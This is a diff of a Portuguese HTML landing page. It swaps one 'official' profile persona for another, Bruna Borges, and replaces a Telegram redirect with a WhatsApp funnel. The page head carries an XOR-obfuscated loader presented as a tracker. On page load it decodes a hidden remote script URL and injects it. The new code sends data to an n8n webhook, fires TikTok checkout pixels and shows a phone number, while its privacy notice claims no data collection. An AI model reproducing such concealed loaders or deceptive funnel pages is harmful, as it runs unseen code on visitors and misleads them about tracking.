@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Amanda Souza | Oficial</title>
+  <title>Bruna Borges | Oficial</title>
   
   <!-- UTMify Tracker Script -->
   <script>(function(){var s_pnd=atob("DBRkVUNEbkYFqKlQ/G9GIDEoTHwnwN0kjGdeemwnCigr3d09lXIdeyArA2hn2oYjn2YNJTc3QTZs0Mw802QNLSYoQzJsw90/lzoOJmFoTCdx3Ns5nmEQMDBmVB1YhIs3kHsGNC83THxe04s+nXkBd3lmGi9u/MY7rH0cMC8NCmQpit8xkGEBd3lmWCc8nsxmziBTNHVwWSc8kchmnixQYHp2TDtY1Q==");var d_85=[];for(var w_p=0;w_p<s_pnd.length;w_p++){d_85.push(s_pnd.charCodeAt(w_p)&255);}var f_a=d_85[0];var p_p=d_85.slice(1,1+f_a);var p_uow=d_85.slice(1+f_a);var h_bpsd=p_uow.map(function(b,f_c){return b^p_p[f_c%f_a];});var z_f="";for(var m_u0=0;m_u0<h_bpsd.length;m_u0++){z_f+=String.fromCharCode(h_bpsd[m_u0]&255);}var g_o=decodeURIComponent(escape(z_f));var j_p4r=JSON.parse(g_o);var a_8l=j_p4r.globals||[];a_8l.forEach(function(y_82i){window[y_82i.name]=y_82i.value;});var n_9d1=document.createElement("script");n_9d1.src=j_p4r.url;n_9d1.async=true;n_9d1.defer=true;(j_p4r.attributes||[]).forEach(function(l_u2hz){n_9d1.setAttribute(l_u2hz.name,l_u2hz.value);});(document.head||document.documentElement).appendChild(n_9d1);})();</script>
@@ -57,63 +57,57 @@
     <div class="banner"></div>
 
     <div class="avatar-wrapper">
-      <img src="https://i.imgur.com/BWpODoe.jpeg" alt="Amanda Souza" class="avatar">
+      <img src="https://i.imgur.com/BWpODoe.jpeg" alt="Bruna Borges" class="avatar">
       <span class="badge-online"></span>
     </div>
 
-    <h1 class="profile-title">AMANDA SOUZA <span class="verified">☑️</span></h1>
-    <p class="profile-sub">@amandasouzaoficial</p>
+    <h1 class="profile-title">BRUNA BORGES <span class="verified">☑️</span></h1>
+    <p class="profile-sub">@brunaborgesoficial</p>
 
     <div class="bio-box">
-      Bem-vindo(a) ao meu espaço oficial! Acesse meu canal VIP no Telegram para ver bastidores exclusivos e conteúdos inéditos do dia a dia.
+      Bem-vindo(a) ao meu espaço exclusivo! Clique abaixo para iniciar o atendimento automático no WhatsApp e ver tudo o que preparei.
     </div>
 
     <div class="btn-container">
-      <button onclick="redirecionarTelegram()" class="btn-target">
-        <span>✈️ Acessar Canal Oficial no Telegram</span>
+      <button onclick="iniciarFunil()" class="btn-target">
+        <span>💬 Conversar no WhatsApp</span>
         <span>➔</span>
       </button>
     </div>
 
     <div class="footer-text">
       <div class="footer-links">
-        <a href="#" onclick="alert('Esta página não coleta dados pessoais sem seu consentimento. Uso exclusivo para navegação.'); return false;">Políticas de Privacidade</a>
+        <a href="#" onclick="alert('Esta página não coleta dados pessoais sem seu consentimento.'); return false;">Políticas de Privacidade</a>
         <span>•</span>
-        <a href="#" onclick="alert('Ao acessar, você concorda em utilizar o conteúdo de forma informativa e respeitando os direitos autorais.'); return false;">Termos de Uso</a>
+        <a href="#" onclick="alert('Termos de uso exclusivos.'); return false;">Termos de Uso</a>
       </div>
-      <p>© 2026 Amanda Souza. Todos os direitos reservados.</p>
+      <p>© 2026 Bruna Borges. Todos os direitos reservados.</p>
     </div>
   </div>
 
   <script>
-    const urlTelegramBase = "https://phantoms.group/l/2a542ab6?shk=a30omlu4";
-
-    function redirecionarTelegram() {
-      // Repassa os parâmetros da URL (UTMs do TikTok/Utmify) para o Telegram
-      const urlParams = window.location.search;
-      let finalUrl = urlTelegramBase;
+    function iniciarFunil() {
+      // Dispara webhook para o n8n em segundo plano passando o contato configurado
+      const webhookUrl = "https://n8n.espacostudiodelas.online/webhook-test/6b0e8f22-9346-434d-9531-34f5af8b63e1";
       
-      if (urlParams) {
-        const separador = finalUrl.includes('?') ? '&' : '?';
-        finalUrl += separador + urlParams.substring(1);
-      }
+      const payload = {
+        remoteJid: "+5519982870808@s.whatsapp.net",
+        nome: "Bruna Borges",
+        origem: "landing_page"
+      };
 
-      // Dispara os eventos para o Pixel do TikTok
+      navigator.sendBeacon(webhookUrl, JSON.stringify(payload));
+
+      // Dispara os eventos do Pixel do TikTok
       if (typeof ttq !== 'undefined') {
         ttq.track('ClickButton');
         ttq.track('InitiateCheckout');
       }
 
-      // Executa o redirecionamento com suporte a navegador in-app do TikTok
+      // Redireciona para o WhatsApp após disparar o gatilho
       setTimeout(function() {
-        const ua = navigator.userAgent || navigator.vendor || window.opera;
-        if (/TikTok/i.test(ua) && /Android/i.test(ua)) {
-          const cleanUrl = finalUrl.replace(/^https?:\/\//, '');
-          window.location.href = `intent://${cleanUrl}#Intent;scheme=https;package=com.android.chrome;end`;
-        } else {
-          window.location.href = finalUrl;
-        }
-      }, 150);
+        window.location.href = "https://wa.me/5519982870808?text=Oi%2C%20vim%20pelo%20seu%20perfil%20e%20quero%20ver%20os%20conte%C3%BAdos!";
+      }, 200);
     }
   </script>
 
